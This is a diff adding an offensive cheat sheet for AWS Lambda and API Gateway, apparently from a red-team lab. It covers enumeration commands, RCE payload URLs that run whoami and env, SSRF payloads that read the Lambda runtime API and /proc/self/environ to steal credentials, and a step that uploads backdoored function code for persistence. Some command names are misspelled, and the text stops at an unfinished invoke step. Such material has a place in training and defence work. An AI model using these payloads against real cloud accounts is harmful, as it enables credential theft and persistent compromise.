@@ -1,0 +1,87 @@
+#lambda
+#Enumeration
+##lambda Function
+###List of all the lambda functions
+aws lambda list-functions
+###Retrieves the Information about the specified lambda function
+aws lambda get-function --function-name <function-name>
+###Retrieves the policy Information about the specified lambda function
+aws lambda get-policy --function-name <function-name>
+###Retrieves the event source mapping Information about the pecified lambda function
+aws lambda list-event-sources-mappings --function-name <function-name>
+###List of all the layers (dependencies) in aws account
+aws lambda list-layers
+###Retrieves the full Information about the specified layer name
+aws lambda get-layer-ersion --layer-name <LayerName> --version-number <VersionNumber>
+
+##API Gateway
+###List of all RestAPIs
+aws apigateway get-rest-apis
+###Get the information about specified API
+aws apigateway get-rest-api --rest-api-id <ApiId>
+###Lists information about a collection of resources
+aws apigateway get-resources --rest-api-id <ApiId>
+###Get information about the specified resources
+aws apigateway get-resource --rest-api-id <ApiId> --resource-id <ResourceID>
+###Get the method information for the specified resource
+aws apigateway get-method --rest-api-id <ApiID> --resource-id <ResourceID> --http-method <Method>
+###List of all stages for a RESTAPI
+aws apigateway get-stage --rest-api-id <ApiId>
+###Get the information about specified API's stage
+aws apigateway get-stage --rest-api-id <ApiId> --stage-name <StageName>
+###List of all the API keys
+aws apigateway get-api-keys --include-values
+###Get the information about a specified API key
+aws apigateway get-api-key --api-key <ApiKey>
+
+
+#Initial Access
+##Remote Code Execution 1
+https://<instance>.execute-api.us-east-2.amazonaws.com/prod/system?cmd=whoami
+##Remote Code Execution 2
+https://i8jee1mn2f.execute-api.us-east-2.amazonaws.com/prod/system?cmd=env
+
+##Credential Access using RCE :
+###Retrieve the Credential from OS environment variable
+https://i8jee1mn2f.execute-api.us-east-2.amazonaws.com/prod/system?cmd=env 
+
+##Credential Access using SSRF :
+###Retrieve the Credential from lambda function event data using internal API 
+https://jpskubt0tc.execute-api.us-east-2.amazonaws.com/prod/RedTeamFun2?url=http://localhost:9001/2018-06-01/runtime/invocation/next 
+###Retrieve the Credential from lambda function run time environment 
+https://jpskubt0tc.execute-api.us-east-2.amazonaws.com/prod/RedTeamFun2?url=file:///proc/self/environ
+
+##Credential Access using CLI :
+###Retrieve the Credential from lambda function environment variable
+aws lambda get-function --function-name <function-name>
+
+
+#Persistence
+##Get Information about user identity / role identity
+aws sts get-caller-identity
+##Lists all managed policies that are attached to the specified IAM user
+aws iam list-attached-user-policies --user-name <user-name>
+##Retrieves information about the specified version of the specified managed policy
+aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>
+###List of all the lambda functions
+aws lambda list-functions
+##Retrieves the Information about the specified lambda function
+aws lambda get-function --function-name <function-name>
+##Retrieves the policy Information about the specified lambda function
+aws lambda get-policy --function-name <function-name>
+
+##Get the information about specified API
+aws apigateway get-rest-api --rest-api-id <ApiId>
+##Lists information about a collection of resources
+aws apigateway get-resources --rest-api-id <ApiId>
+##Get information about the specified resource
+aws apigateway get-resource --rest-api-id <ApiId> --resource-id <ResourceID>
+##Get the method information for the specified resources
+aws apigateway get-method --rest-api-id <ApiID> --resource-id <ResourceID> --http-method <Method>
+##List of all stages for a REST API
+aws apigateway get-stages --rest-api-id <ApiID>
+##Get the information about specified API's stage
+aws apigateway get-stage --rest-api-id <ApiID> --stage-name <StageName>
+##Upload the backdoor updated code to aws lambda function
+aws lambda update-function-code --function-name my-function --zip-file file://my-function.zip
+##Invoke the update lambda
